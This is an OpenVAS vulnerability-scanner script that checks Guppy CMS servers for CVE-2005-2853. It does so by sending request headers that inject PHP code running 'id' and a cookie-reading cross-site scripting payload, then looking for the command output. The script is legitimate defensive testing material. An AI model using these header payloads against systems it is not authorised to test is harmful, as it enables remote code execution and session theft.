# OpenVAS Vulnerability Test
# $Id: guppy_request_header_flaws.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Guppy Request Header Injection Vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP script that allows for 
arbitrary code execution and cross-site scripting attacks.

Description : 

The remote host is running Guppy, a CMS written in PHP.

The remote version of this software does not properly sanitize input
to the Referer and User-Agent HTTP headers before using it in the
'error.php' script.  A malicious user can exploit this flaw to inject
arbitrary script and HTML code into a user's browser or, if PHP's
'magic_quotes_gpc' seting is disabled, PHP code to be executed on the
remote host subject to the privileges of the web server user id.";

tag_solution = "Upgrade to Guppy version 4.5.4 or later.";

  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;

if (description) {
  script_id(19943);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2005-2853");
  script_bugtraq_id(14753);

  name = "Guppy Request Header Injection Vulnerabilities";
  script_name(name);
 
  script_description(desc);
 
  summary = "Checks for request header injection vulnerabilities in Guppy";
  script_summary(summary);
 
  script_category(ACT_ATTACK);
  script_family("Web application abuses");

  script_copyright("(C) 2005 Josh Zlatin-Amishav");
  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.frsirt.com/english/advisories/2005/1639");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# A simple alert.
xss = "<script>alert(document.cookie);</script>";

# Loop through CGI directories.
foreach dir (cgi_dirs()) 
{
  # Try to exploit the flaw.
  req = string(
    "GET ", dir, "/error.php?err=404 HTTP/1.1\r\n",
    # nb: try to execute id.
    "User-Agent: ", '"; system(id);#', "\r\n",
    #     and try to inject some javascript.
    "Referer: ", xss, "\r\n",
    "Host: ", get_host_name(), "\r\n",
    "\r\n"
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  # We need to follow the 302 redirection
  pat = "location: (.+)";
  matches = egrep(string:res, pattern:pat);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      url = eregmatch(string:match, pattern:pat);
      if (url == NULL) break;
      url = url[1];
      debug_print("url[", url, "]\n");
      break;
    }
  }

  if (url) {
    req = http_get(item:string(dir, "/", url), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # Get results of id command.
    pat = "^(uid=[0-9]+.*gid=[0-9]+.*)";
    matches = egrep(string:res, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        idres = eregmatch(string:match, pattern:pat);
        if (idres == NULL) break;
        idres = idres[1];
        debug_print("idres[", idres, "]\n");
        break;
      }
    }

    # Check for the results of the id command.
    if (idres)
    {
      report = string(
        desc,
        "\n",
        "The following is the output received from the 'id' command:\n", 
        "\n",
        idres,
        "\n"
      );

      security_warning(port, data:report);
      exit(0);
    }
    # Check for XSS.
    else if (xss >< res && !get_kb_item("www/"+port+"/generic_xss"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
